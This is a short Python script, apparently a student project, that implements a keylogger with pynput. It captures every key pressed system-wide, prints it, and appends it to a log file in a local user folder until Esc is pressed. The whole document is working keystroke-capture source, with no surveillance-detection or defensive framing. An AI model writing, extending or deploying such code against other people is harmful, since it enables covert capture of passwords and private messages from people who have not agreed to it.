# Using pynput.keyboard we can import a key listener to capture keys as they're pressed and save them into an empty list.
from pynput.keyboard import Key, Listener

file_path = "C:\\Users\\Bryce\\PycharmProjects\\Project 4 - Keylogger\\Pieces\\Key Logger"
extend = "\\"
file_merge = file_path + extend

keys_information = "key_log.txt"

count = 0
keys = []

def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

